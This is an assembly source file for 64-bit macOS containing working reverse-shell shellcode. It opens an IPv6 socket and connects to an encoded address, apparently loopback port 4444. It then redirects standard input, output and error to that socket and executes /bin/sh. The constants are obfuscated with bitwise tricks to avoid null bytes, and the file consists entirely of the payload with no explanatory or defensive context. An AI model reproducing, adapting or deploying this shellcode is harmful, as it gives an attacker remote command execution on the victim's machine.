;nasm -f macho64 -o ipv6rev.o ipv6rev.s && ld -macosx_version_min 10.7.0 -o ipv6rev ipv6rev.o

BITS 64

section .text

global start

start:
    ; socket(AF_INET6, SOCK_STREAM, IPPROTO_IP)
    xor  rdi, rdi
    mul  rdi
    mov  dil, 0x1e
    xor  rsi, rsi
    mov  sil, 0x1
    mov  al, 0x2
    ror  rax, 0x28
    mov  r8, rax
    mov  al, 0x61
    syscall

    ; struct sockaddr_in6 {
    ;         __uint8_t       sin6_len;
    ;         sa_family_t     sin6_family;
    ;         in_port_t       sin6_port;
    ;         __uint32_t      sin6_flowinfo;
    ;         struct in6_addr sin6_addr;
    ;         __uint32_t      sin6_scope_id;
    ; };
    xor  rsi, rsi
    push rsi
    mov  rbx, 0xfeffffffffffffff
    not  rbx
    push rbx
    push rsi
    mov  rsi, 0xffffffffa3eee1e4
    neg  rsi
    push rsi
    push rsp
    pop  rsi

    ; connect(sockid, &sockaddr, 28)
    mov  rdi, rax
    xor  dl, 0x1c
    mov  rax, r8
    mov  al, 0x62
    syscall    

    xor rsi, rsi
    mov sil, 0x3

dup2:
    ; dup2(sockid, 2)
    ;   -> dup2(sockid, 1)
    ;   -> dup2(sockid, 0)
    mov  rax, r8
    mov  al, 0x5a
    sub  sil, 1
    syscall
    test rsi, rsi
    jne  dup2

    ; execve("//bin/sh", 0, 0)
    push rsi
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    xor  rdx, rdx
    mov  rax, r8
    mov  al, 0x3b
    syscall
    